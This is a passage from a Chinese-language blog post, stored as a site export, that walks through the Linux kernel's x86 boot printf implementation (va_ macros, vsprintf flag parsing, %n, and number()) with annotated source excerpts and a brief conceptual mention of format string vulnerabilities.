\n首先定义一个静态的常量数组保存进制转换的字符,便于直接寻址取得相应字符赋值给str.`tmp[66]`我认为目前来看是有点长,它的作用是暂存num转换之后的数据,num最大为`long`的最大值,为2^64(64bit),也就是16个F,即16个字符即可,愚以为有点多余~~~.locase探测type字段的SMALL标志,不得不说SMALL标志位也是取得合理,32->第4位置位,使得可以很轻松地`或`运算实现大写字符->小写字符(ascll码相差32).如果`0`和`-`同时置位,gcc编译器会提示`warning: '0' flag ignored with '-' flag in gnu_printf format [-Wformat=]`,表明会忽略掉`0`的作用,具体实现也是这样.首先会判断是否有左对齐标志,有的话就用经典的`&= ~`运算来清除相应标志位,这个在嵌入式开发里面很常见,一般是操作外设寄存器用的.在这里的逻辑是清除`补零`标志.这里也有一个健壮性的判断,不过number函数仅限于本文件调用,一般的开发者应该不会传入错误的base.字符`c`也是用来填充的,为`0`或者空格.接下来就是检测SIGH标志,并根据正负和0填充的需求占据`size`和置位`sign`.之后判断16进制和8进制情况,16进制的`size`减2是由于要填充`0x`或者`0X`,8进制只需要填充`0`即可.之后就开始进制转换成字符了,并根据`locase`的实际情况对于16进制翻转大小写字符.而对于数字0~9,由于他们的ascll码的第4位已经置位,所以或上1并不影响自身的值,而默认的大写字母第4位没有置位,如果程序员需要转换就可以转换.这个是很巧妙的!!!值得学习的技巧.传进来的`precision`表示精度,由于这里没有浮点匹配,这里就主要用来截取串的长度.如果`ZEROPAD`和`LEFT`都没有置位,就填充空格.然后根据进制继续填充数值.如果不是左对齐,就根据`size`的剩余大小继续填充`c`,后面就根据i的情况填充了,直到满足`size`这个宽度域为0.最后返回`str`的首地址.\n```C\nstatic char *number(char *str, long num, int base, int size, int precision,\n\t\t    int type)\n{\n\t/* we are called with base 8, 10 or 16, only, thus don't need \"G...\"  */\n\tstatic const char digits[16] = \"0123456789ABCDEF\"; /* \"GHIJKLMNOPQRSTUVWXYZ\"; */\n\n\tchar tmp[66];\n\tchar c, sign, locase;\n\tint i;\n\n\t/* locase = 0 or 0x20. ORing digits or letters with 'locase'\n\t * produces same digits or (maybe lowercased) letters */\n\tlocase = (type & SMALL);\n\tif (type & LEFT)\n\t\ttype &= ~ZEROPAD;\n\tif (base < 2 || base > 16)\n\t\treturn NULL;\n\tc = (type & ZEROPAD) ? '0' : ' ';\n\tsign = 0;\n\tif (type & SIGN) {\n\t\tif (num < 0) {\n\t\t\tsign = '-';\n\t\t\tnum = -num;\n\t\t\tsize--;\n\t\t} else if (type & PLUS) {\n\t\t\tsign = '+';\n\t\t\tsize--;\n\t\t} else if (type & SPACE) {\n\t\t\tsign = ' ';\n\t\t\tsize--;\n\t\t}\n\t}\n\tif (type & SPECIAL) {\n\t\tif (base == 16)\n\t\t\tsize -= 2;\n\t\telse if (base == 8)\n\t\t\tsize--;\n\t}\n\ti = 0;\n\tif (num == 0)\n\t\ttmp[i++] = '0';\n\telse\n\t\twhile (num != 0)\n\t\t\ttmp[i++] = (digits[__do_div(num, base)] | locase);\n\tif (i > precision)\n\t\tprecision = i;\n\tsize -= precision;\n\tif (!(type & (ZEROPAD + LEFT)))\n\t\twhile (size-- > 0)\n\t\t\t*str++ = ' ';\n\tif (sign)\n\t\t*str++ = sign;\n\tif (type & SPECIAL) {\n\t\tif (base == 8)\n\t\t\t*str++ = '0';\n\t\telse if (base == 16) {\n\t\t\t*str++ = '0';\n\t\t\t*str++ = ('X' | locase);\n\t\t}\n\t}\n\tif (!(type & LEFT))\n\t\twhile (size-- > 0)\n\t\t\t*str++ = c;\n\twhile (i < precision--)\n\t\t*str++ = '0';\n\twhile (i-- > 0)\n\t\t*str++ = tmp[i];\n\twhile (size-- > 0)\n\t\t*str++ = ' ';\n\treturn str;\n}\n```\n## puts\n至于puts的实现应该就不难了,内核中有很多处代码.应该就是简单地逐字节地拷贝到某缓冲区,再由内核的IO调度机制向屏幕或者串口等字符驱动设备文件拷贝输出.一般在嵌入式开发里面串口输出的比较常见.而普通PC的CPU(类似以前8086时代的intel)可能是按照主板等的设计给显存预留出地址空间,只要CPU把数据送往那个地址空间(貌似是0x0B800)显示设备就能够打印出相应的字符.\n## 总结\n最起初的printf实现大概就这么多吧,可能内核开发者考虑到某些CPU没有浮点体系就没有把处理浮点类型的情况加进去的,标准的printf实现还是需要参考glibc库的.后期有空继续分析.对了,前面有说到`格式化字符串漏洞`参考看雪论坛这篇[文章](http://bbs.pediy.com/showthread.php?t=213153),如果没注册看不了的话先[戳这里吧](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458279936&idx=1&sn=2eb47265a0d170c45403d4b5d9097549&chksm=b181508a86f6d99c27d4b2c9281a573ac16284c3a7f7f6f3d9cad3a7452f3bcc22ba15616303&scene=0#wechat_redirect)\n","slug":"一起来撸printf吧","published":1,"updated":"2016-11-14T02:56:11.102Z","_id":"civhnccvx000hg8uabimqw0df","comments":1,"layout":"post","photos":[],"link":"","content":"<blockquote>\n<p>printf实现还隐藏了很多参数,例如%n,printf返回值是啥你知道吗?格式化字符串漏洞成因何在?这里分析Linux内核中的printf实现,而非glibc库中的标准实现(我们用的肯定是标准库咯,不过很复杂~_~),因为这里没有%f等浮点类型的匹配,简单一些.</p>\n</blockquote>\n<p>参考资料:<br><a href=\"https://github.com/torvalds/linux/blob/master/arch/x86/boot/printf.c\" target=\"_blank\" rel=\"external\">Linus的github仓库https://github.com/torvalds/linux/blob/master/arch/x86/boot/printf.c</a></p>\n<h2 id=\"printf大体\"><a href=\"#printf大体\" class=\"headerlink\" title=\"printf大体\"></a>printf大体</h2><p>首先我们找到printf函数的实现(由于x86体系容易理解便选择了这个体系),可以看到申请了1024个字节的空间来保存要格式化串,有人会问要是我给出的参数超过了1024不就缓冲区溢出程序会crash掉吗?我觉得编译器肯定会察觉到的,有兴趣的自己鼓捣下…大体就是将传递进来的参数根据压栈的顺序逐个取出并格式化成字符串,这个是在vsprintf函数实现的,返回值是两个地址的差,即本次输出的字符串数目.最后调用puts函数向终端输出.最后后才返回本次输出字符串数目.<br><img src=\"/images/printf.png\" alt=\"printf\"></p>\n<h2 id=\"va-系类宏\"><a href=\"#va-系类宏\" class=\"headerlink\" title=\"va_系类宏\"></a>va_系类宏</h2><p>然后我们利用sublime的插件来jump到<code>va_list</code>的定义,发现是一个char*的typedef.干脆就一起来认识一下<code>va_</code>系列的宏.</p>\n<p><code>acpi_native_int</code>也是一个typedef,根据最开始的配置决定是s32还是s64,在x86这里肯定就是有符号的32位了,即int类型的.<code>_AUPBND</code>和<code>_ADNBND</code>两个宏的值一样.而<code>_bnd</code>这个宏在32b体系下给出的是类型X的大小的4字节对齐值.在printf里面用的时候关系不是很大,因为格式化的时候不会是很大结构体(%结构体根本没实现啊),纵然是小于4字节的char,short之类的,存的时候可能是那么多字节,但是压栈的时候编译器会毫不犹豫地安排用一个寄存器扩展并压入栈顶的指令,所以不用担心,可以认为这个宏在printf里面仅仅是4字节对齐没问题的.<code>va_start(ap, A)</code>这个宏接到A(fmt)地址,再+4赋值给ap,原因在于A(fmt)是printf的第一个参数(格式化字符串含有%的部分),+4之后才能对准第一个真正要格式化的参数.而<code>va_arg(ap, T)</code>目的是先使得ap移往后一个参数但是返回的值确实本次参数的值,比较巧妙.<code>va_end(ap)</code>仅仅为了保证安全而象征性地将ap指向NULL.<br><img src=\"/images/va_arg.png\" alt=\"va_arg\"></p>\n<h2 id=\"vsprintf\"><a href=\"#vsprintf\" class=\"headerlink\" title=\"vsprintf\"></a>vsprintf</h2><p>vsprintf这个函数有几个重要的局部变量需要注意,英文注释写的很清楚了,flags标志主要是关于数字对齐这一块,等到number函数被调用的时候会判断的.field_width字段主要是占用宽度计算.precision是精度计算,其实是输出个字符个数控制.qualifier是对于长整型的扩展,例如将int转为long.(x86下int=long)<br><img src=\"/images/vsprintf.png\" alt=\"vsprintf\"><br>在定义了局部变量之后,一个for循环遍历fmt所有的字符,取出特别的%来格式化,最后计算地址偏移便完结了.当找到第一个%的时候,首先处理flags字段,定义个标号repeat来快速跳出,虽然听说C标准不推荐使用goto语句,但是能够提高效率为什么不能用呢?代码片段如下:<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> ZEROPAD\t1\t\t<span class=\"comment\">/* pad with zero */</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> SIGN\t2\t\t<span class=\"comment\">/* unsigned/signed long */</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> PLUS\t4\t\t<span class=\"comment\">/* show plus */</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> SPACE\t8\t\t<span class=\"comment\">/* space if plus */</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> LEFT\t16\t\t<span class=\"comment\">/* left justified */</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> SMALL\t32\t\t<span class=\"comment\">/* Must be 32 == 0x20 */</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> SPECIAL\t64\t\t<span class=\"comment\">/* 0x */</span></span></div><div class=\"line\"><span class=\"comment\">/* process flags */</span></div><div class=\"line\">\t\tflags = <span class=\"number\">0</span>;</div><div class=\"line\">\t      repeat:</div><div class=\"line\">\t\t++fmt;\t\t<span class=\"comment\">/* this also skips first '%' */</span></div><div class=\"line\">\t\t<span class=\"keyword\">switch</span> (*fmt) &#123;</div><div class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"string\">'-'</span>:</div><div class=\"line\">\t\t\tflags |= LEFT;</div><div class=\"line\">\t\t\t<span class=\"keyword\">goto</span> repeat;</div><div class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"string\">'+'</span>:</div><div class=\"line\">\t\t\tflags |= PLUS;</div><div class=\"line\">\t\t\t<span class=\"keyword\">goto</span> repeat;</div><div class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"string\">' '</span>:</div><div class=\"line\">\t\t\tflags |= SPACE;</div><div class=\"line\">\t\t\t<span class=\"keyword\">goto</span> repeat;</div><div class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"string\">'#'</span>:</div><div class=\"line\">\t\t\tflags |= SPECIAL;</div><div class=\"line\">\t\t\t<span class=\"keyword\">goto</span> repeat;</div><div class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"string\">'0'</span>:</div><div class=\"line\">\t\t\tflags |= ZEROPAD;</div><div class=\"line\">\t\t\t<span class=\"keyword\">goto</span> repeat;</div><div class=\"line\">\t\t&#125;</div></pre></td></tr></table></figure></p>\n<p>某些字段就不说了,用过printf的应该都知道的,其中的<code>#</code>作用就是方便16进制和8进制的格式化,例如<code>%#x</code>就会被默认加上<code>0x</code>,而<code>%#o</code>就会被默认加上<code>0</code>,具体可以看后面number函数实现就知道了.  </p>\n<hr>\n<blockquote>\n<p>找工作太忙了,今天才得有空继续分析^~^(2016.10.17) </p>\n</blockquote>\n<hr>\n<p>接下来就会去获得宽度字段,利用<code>isdigital</code>函数一步实现字符串转整型并使得fmt指针指向后续格式符.如果用<code>*</code>代替,将直接将压入的参数转为整型赋值为宽度字段.并根据正负号置标志位采取相应的对齐方式(默认为右对齐).  </p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">/* get field width */</span></div><div class=\"line\">\t\tfield_width = <span class=\"number\">-1</span>;</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (<span class=\"built_in\">isdigit</span>(*fmt))</div><div class=\"line\">\t\t\tfield_width = skip_atoi(&amp;fmt);</div><div class=\"line\">\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (*fmt == <span class=\"string\">'*'</span>) &#123;</div><div class=\"line\">\t\t\t++fmt;</div><div class=\"line\">\t\t\t<span class=\"comment\">/* it's the next argument */</span></div><div class=\"line\">\t\t\tfield_width = va_arg(args, <span class=\"keyword\">int</span>);</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (field_width &lt; <span class=\"number\">0</span>) &#123;</div><div class=\"line\">\t\t\t\tfield_width = -field_width;</div><div class=\"line\">\t\t\t\tflags |= LEFT;</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t&#125;</div></pre></td></tr></table></figure>\n<p>再下来就是获取精度了,一般有浮点类型的就得保留多少位的精度.首先得在串中检测到有<code>.</code>字符,之后的处理跟宽度就差不多了.先保存相关的参数然后会传到另外的函数做具体处理的.对于有<code>l</code>,<code>L</code>,<code>h</code>跟在后面的将使得<code>qualifier</code>被置为其ascll码值.<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">/* get the precision */</span></div><div class=\"line\">\t\tprecision = <span class=\"number\">-1</span>;</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (*fmt == <span class=\"string\">'.'</span>) &#123;</div><div class=\"line\">\t\t\t++fmt;</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (<span class=\"built_in\">isdigit</span>(*fmt))</div><div class=\"line\">\t\t\t\tprecision = skip_atoi(&amp;fmt);</div><div class=\"line\">\t\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (*fmt == <span class=\"string\">'*'</span>) &#123;</div><div class=\"line\">\t\t\t\t++fmt;</div><div class=\"line\">\t\t\t\t<span class=\"comment\">/* it's the next argument */</span></div><div class=\"line\">\t\t\t\tprecision = va_arg(args, <span class=\"keyword\">int</span>);</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (precision &lt; <span class=\"number\">0</span>)</div><div class=\"line\">\t\t\t\tprecision = <span class=\"number\">0</span>;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\"></div><div class=\"line\">\t\t<span class=\"comment\">/* get the conversion qualifier */</span></div><div class=\"line\">\t\tqualifier = <span class=\"number\">-1</span>;</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (*fmt == <span class=\"string\">'h'</span> || *fmt == <span class=\"string\">'l'</span> || *fmt == <span class=\"string\">'L'</span>) &#123;</div><div class=\"line\">\t\t\tqualifier = *fmt;</div><div class=\"line\">\t\t\t++fmt;</div><div class=\"line\">\t\t&#125;</div></pre></td></tr></table></figure></p>\n<p>之后就进入最后的格式化匹配了,根据提供的格式化类型对压入的参数进行相应操作.首先会使得base默认为10进制,如果类似%c的话,直接根据左右对齐方式填充空白符,中间以<code>int</code>类型为地址单元取得参数的值直接强制转化为<code>unsigned char</code>类型的字符.为什么呢?详情参考我的另外一篇<a href=\"http://www.rutk1t0r.cn/2016/08/21/memory-align/\" target=\"_blank\" rel=\"external\">文章</a>,我们需要知道这个是编译器自己这么压进去的就得这么去接收就行了.对于类似%s,首先取得参数首地址,然后调用安全的<code>strnlen</code>函数获取填充空白的长度.之后逐字符地拷贝,若非右对齐后续还需继续填充空白,<code>if</code>和<code>while</code>没有加<code>{}</code>可能看得不太清楚.建议源代码中的风格严谨一点好.对于%p如果没有字段宽度值则默认为2个指针大小的宽度,并使得flags的ZEROPAD置位.而后直接送往number函数继续处理.%n可是一个很生疏的东西,我猜测这个参数最初的目的是用于调试用的,可以检查本次printf调用在%n之前输出的字符个数,并将这个值赋给调用者传递进来的参数地址处,但是如果使用不当,就可能会造成<code>任意地址读写任意数据</code>的格式化字符串漏洞.<br>之后的几个参数大都是置位相应标志位而已,后期直接送往number函数处理,需要注意的是之前这几个参数后面完成后用的是<code>continue</code>,意思是直接跳转到最外面的<code>for</code>循环进行下一个字符的匹配,而%xXdiu后面接的是<code>break</code>,表示退出<code>switch</code>,转而进行后面的<code>h,L,l</code>的长类型的处理去了.还要注意在<code>switch case break</code>的结构中,如果<code>case</code>了第一个条件,之后如果没有遇到<code>break</code>,程序的控制流程将忽略后面的<code>case</code>条件,直接执行语句部分,直到遇见结束的<code>break</code>.因为这里已经出现了这种用法(匹配x的时候),所以应该注意一下,某些笔试题也会考察这个知识点.<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">/* default base */</span></div><div class=\"line\">\t\tbase = <span class=\"number\">10</span>;</div><div class=\"line\"></div><div class=\"line\">\t\t<span class=\"keyword\">switch</span> (*fmt) &#123;</div><div class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"string\">'c'</span>:</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (!(flags &amp; LEFT))</div><div class=\"line\">\t\t\t\t<span class=\"keyword\">while</span> (--field_width &gt; <span class=\"number\">0</span>)</div><div class=\"line\">\t\t\t\t\t*str++ = <span class=\"string\">' '</span>;</div><div class=\"line\">\t\t\t*str++ = (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">char</span>)va_arg(args, <span class=\"keyword\">int</span>);</div><div class=\"line\">\t\t\t<span class=\"keyword\">while</span> (--field_width &gt; <span class=\"number\">0</span>)</div><div class=\"line\">\t\t\t\t*str++ = <span class=\"string\">' '</span>;</div><div class=\"line\">\t\t\t<span class=\"keyword\">continue</span>;</div><div class=\"line\"></div><div class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"string\">'s'</span>:</div><div class=\"line\">\t\t\ts = va_arg(args, <span class=\"keyword\">char</span> *);</div><div class=\"line\">\t\t\tlen = strnlen(s, precision);</div><div class=\"line\"></div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (!(flags &amp; LEFT))</div><div class=\"line\">\t\t\t\t<span class=\"keyword\">while</span> (len &lt; field_width--)</div><div class=\"line\">\t\t\t\t\t*str++ = <span class=\"string\">' '</span>;</div><div class=\"line\">\t\t\t<span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; len; ++i)</div><div class=\"line\">\t\t\t\t*str++ = *s++;</div><div class=\"line\">\t\t\t<span class=\"keyword\">while</span> (len &lt; field_width--)</div><div class=\"line\">\t\t\t\t*str++ = <span class=\"string\">' '</span>;</div><div class=\"line\">\t\t\t<span class=\"keyword\">continue</span>;</div><div class=\"line\"></div><div class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"string\">'p'</span>:</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (field_width == <span class=\"number\">-1</span>) &#123;</div><div class=\"line\">\t\t\t\tfield_width = <span class=\"number\">2</span> * <span class=\"keyword\">sizeof</span>(<span class=\"keyword\">void</span> *);</div><div class=\"line\">\t\t\t\tflags |= ZEROPAD;</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t\tstr = number(str,</div><div class=\"line\">\t\t\t\t     (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span>)va_arg(args, <span class=\"keyword\">void</span> *), <span class=\"number\">16</span>,</div><div class=\"line\">\t\t\t\t     field_width, precision, flags);</div><div class=\"line\">\t\t\t<span class=\"keyword\">continue</span>;</div><div class=\"line\"></div><div class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"string\">'n'</span>:</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (qualifier == <span class=\"string\">'l'</span>) &#123;</div><div class=\"line\">\t\t\t\t<span class=\"keyword\">long</span> *ip = va_arg(args, <span class=\"keyword\">long</span> *);</div><div class=\"line\">\t\t\t\t*ip = (str - buf);</div><div class=\"line\">\t\t\t&#125; <span class=\"keyword\">else</span> &#123;</div><div class=\"line\">\t\t\t\t<span class=\"keyword\">int</span> *ip = va_arg(args, <span class=\"keyword\">int</span> *);</div><div class=\"line\">\t\t\t\t*ip = (str - buf);</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t\t<span class=\"keyword\">continue</span>;</div><div class=\"line\"></div><div class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"string\">'%'</span>:</div><div class=\"line\">\t\t\t*str++ = <span class=\"string\">'%'</span>;</div><div class=\"line\">\t\t\t<span class=\"keyword\">continue</span>;</div><div class=\"line\"></div><div class=\"line\">\t\t\t<span class=\"comment\">/* integer number formats - set up the flags and \"break\" */</span></div><div class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"string\">'o'</span>:</div><div class=\"line\">\t\t\tbase = <span class=\"number\">8</span>;</div><div class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</div><div class=\"line\"></div><div class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"string\">'x'</span>:</div><div class=\"line\">\t\t\tflags |= SMALL;</div><div class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"string\">'X'</span>:</div><div class=\"line\">\t\t\tbase = <span class=\"number\">16</span>;</div><div class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</div><div class=\"line\"></div><div class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"string\">'d'</span>:</div><div class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"string\">'i'</span>:</div><div class=\"line\">\t\t\tflags |= SIGN;</div><div class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"string\">'u'</span>:</div><div class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</div><div class=\"line\"></div><div class=\"line\">\t\t<span class=\"keyword\">default</span>:</div><div class=\"line\">\t\t\t*str++ = <span class=\"string\">'%'</span>;</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (*fmt)</div><div class=\"line\">\t\t\t\t*str++ = *fmt;</div><div class=\"line\">\t\t\t<span class=\"keyword\">else</span></div><div class=\"line\">\t\t\t\t--fmt;</div><div class=\"line\">\t\t\t<span class=\"keyword\">continue</span>;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (qualifier == <span class=\"string\">'l'</span>)</div><div class=\"line\">\t\t\tnum = va_arg(args, <span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span>);</div><div class=\"line\">\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (qualifier == <span class=\"string\">'h'</span>) &#123;</div><div class=\"line\">\t\t\tnum = (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">short</span>)va_arg(args, <span class=\"keyword\">int</span>);</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (flags &amp; SIGN)</div><div class=\"line\">\t\t\t\tnum = (<span class=\"keyword\">short</span>)num;</div><div class=\"line\">\t\t&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (flags &amp; SIGN)</div><div class=\"line\">\t\t\tnum = va_arg(args, <span class=\"keyword\">int</span>);</div><div class=\"line\">\t\t<span class=\"keyword\">else</span></div><div class=\"line\">\t\t\tnum = va_arg(args, <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>);</div><div class=\"line\">\t\tstr = number(str, num, base, field_width, precision, flags);</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t*str = <span class=\"string\">'\\0'</span>;</div><div class=\"line\">\t<span class=\"keyword\">return</span> str - buf;</div></pre></td></tr></table></figure></p>\n<h2 id=\"number函数\"><a href=\"#number函数\" class=\"headerlink\" title=\"number函数\"></a>number函数</h2><p>首先分析一下这个宏定义的作用,如果先看number函数里面用到这个宏居然是放在<code>[]</code>里面的,因此可以猜测作用是用来偏移寻址的.有些人会问,C语言里面可以这样用吗?(答案很明了了,不能用怎么编译通过呢?所以还是需要多看别人写的代码,有些用法不常用的但是如果好用就可以Get到了)编译器编译的时候能够生成合适的代码即可.这个宏的作用是求出n对base余数,并使得n变为商,同时”返回”余数__res.主要用于八进制和十六进制的数值与字符的转换.(不知是否C语言的思想是一切皆为表达式,据说类*nix操作系统和shell的核心思想分别是<code>一切皆为文件</code>和<code>一切皆为表达式</code>.)<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __do_div(n, base) (&#123; \\</span></div><div class=\"line\">int __res; \\</div><div class=\"line\">__res = ((unsigned long) n) % (unsigned) base; \\</div><div class=\"line\">n = ((unsigned long) n) / (unsigned) base; \\</div><div class=\"line\">__res; &#125;)</div></pre></td></tr></table></figure></p>\n<p>再来看number函数的实现,首先分析函数的参数以及返回值,作为软件工程师应该要做到文档清晰可理解,各个接口的参数以及返回值的作用解释清楚.<code>static</code>类型的函数表明这个函数仅仅在这个文件作用域可以调用,这样减少了命名冲突问题.<code>char *</code>返回值表明能够实现链式功能,可对比<code>strcpy</code>函数的实现.再来看参数,第一个str即上层传入的str首地址,表明要对上层传进来的参数空间进行修改.第二个<code>num</code>是对%idp等格式化的栈参数的一个拷贝.第三个<code>base</code>顾名思义就是进制基数了.第四个<code>size</code>即为对齐宽度.第五个为精度,最后一个为标志位字段.<br>首先定义一个静态的常量数组保存进制转换的字符,便于直接寻址取得相应字符赋值给str.<code>tmp[66]</code>我认为目前来看是有点长,它的作用是暂存num转换之后的数据,num最大为<code>long</code>的最大值,为2^64(64bit),也就是16个F,即16个字符即可,愚以为有点多余~~~.locase探测type字段的SMALL标志,不得不说SMALL标志位也是取得合理,32-&gt;第4位置位,使得可以很轻松地<code>或</code>运算实现大写字符-&gt;小写字符(ascll码相差32).如果<code>0</code>和<code>-</code>同时置位,gcc编译器会提示<code>warning: &#39;0&#39; flag ignored with &#39;-&#39; flag in gnu_printf format [-Wformat=]</code>,表明会忽略掉<code>0</code>的作用,具体实现也是这样.首先会判断是否有左对齐标志,有的话就用经典的<code>&amp;= 